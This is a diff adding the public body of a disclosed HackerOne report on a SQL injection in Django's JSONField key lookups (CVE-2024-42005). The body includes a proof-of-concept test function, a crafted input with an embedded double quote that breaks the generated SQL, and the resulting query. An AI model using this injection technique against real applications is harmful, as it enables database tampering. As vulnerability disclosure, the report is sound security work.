@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "SQL Injection"
 enriched: true
+body: true
 date: 2025-09-12
 submitted: 2024-07-07T08:20:30.305Z
 bounty_usd: null
@@ -26,6 +27,51 @@ title: "SQL injection in JSONField KeyTransform"
 - Report: [https://hackerone.com/reports/2588426](https://hackerone.com/reports/2588426)
 - CWE: SQL Injection | CVE: CVE-2024-42005
 - Submitted: 2024-07-07T08:20:30.305Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hi Django team
+
+The vulnerability is in:
+https://github.com/django/django/blob/main/tests/model_fields/test_jsonfield.py#L427
+I created a function and added it to the "test_jsonfield.py" to explain the vulnerability (POC).
+```
+    def test_sqli(self):
+
+        # say a to get value b
+        # say b to get value c
+        # say " for syntax error in sql
+        user_input = "b"
+
+        NullableJSONModel.objects.create(value_custom={"a": "b"})
+        NullableJSONModel.objects.create(value_custom={"b": "c"})
+        qs = NullableJSONModel.objects.filter(value_custom__isnull=False).values(
+            "value_custom__" + user_input,
+        ).annotate(
+            count=Count("id"),
+        )
+
+        for i in qs:
+            v = i["value_custom__" + user_input]
+            if v:
+                print(v)
+```
+to execute the below code i did:
+`python runtests.py model_fields.test_jsonfield.TestQuerying.test_sqli`
+When I execute above function with `user_input = "beeeee\""` in the code, I get sql syntax error.
+
+The sql code that get executed is:
+`SELECT COUNT("model_fields_nullablejsonmodel"."id") AS "count", (CASE WHEN JSON_TYPE("model_fields_nullablejsonmodel"."value_custom", ?) IN ('true','null','false') THEN JSON_TYPE("model_fields_nullablejsonmodel"."value_custom", ?) ELSE JSON_EXTRACT("model_fields_nullablejsonmodel"."value_custom", ?) END) AS "value_custom__beeeee"" FROM "model_fields_nullablejsonmodel" WHERE "model_fields_nullablejsonmodel"."value_custom" IS NOT NULL GROUP BY 2`
+
+## Impact
+
+if user input get into `.values(` the user will able to create sql injection attack.
+
+I hope you have best day :)
+
+Eyal
 
 ## Timeline
 
